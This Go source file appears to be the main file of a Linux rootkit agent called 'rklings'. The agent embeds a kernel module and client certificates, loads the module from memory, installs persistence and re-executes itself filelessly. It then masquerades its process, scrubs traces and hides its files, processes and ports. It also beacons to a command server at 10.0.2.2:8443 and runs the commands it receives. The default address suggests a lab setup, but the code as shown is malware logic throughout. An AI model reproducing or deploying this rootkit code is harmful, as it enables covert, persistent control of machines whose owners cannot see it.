package main

import (
	"bufio"
	_ "embed"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

//go:embed rklings.ko
var koBytes []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

func main() {
	if err := acquireSingleton(); err != nil {
		log.Fatalf("agent already running: %v", err)
	}
	deploy()
	for {
		conn := dialWithJitter()
		if local, ok := conn.LocalAddr().(*net.TCPAddr); ok {
			mkdirCmd("h.p." + strconv.Itoa(local.Port))
		}
		dispatch(bufio.NewReader(conn), conn)
		_ = conn.Close()
	}
}

func deploy() {
	link, _ := os.Readlink("/proc/self/exe")
	if !strings.Contains(link, "memfd") {
		if _, err := os.Stat("/sys/module/rklings"); os.IsNotExist(err) {
			if err := loadModuleFromMemory(koBytes); err != nil {
				log.Fatalf("load module: %v", err)
			}
		}
		mkdirCmd("h.m")
		mkdirCmd("h.f.rklings")
		if err := installPersistence(); err != nil {
			log.Fatalf("install persistence: %v", err)
		}
		mkdirCmd("h.c.rklings")
		reexecFromMemory()
	}
	masquerade()
	mkdirCmd("h.i." + strconv.Itoa(os.Getpid()))
	scrubAll()
}

func mkdirCmd(name string) error {
	path := "/tmp/rklings." + name
	err := os.Mkdir(path, 0755)
	_ = os.Remove(path)
	return err
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}
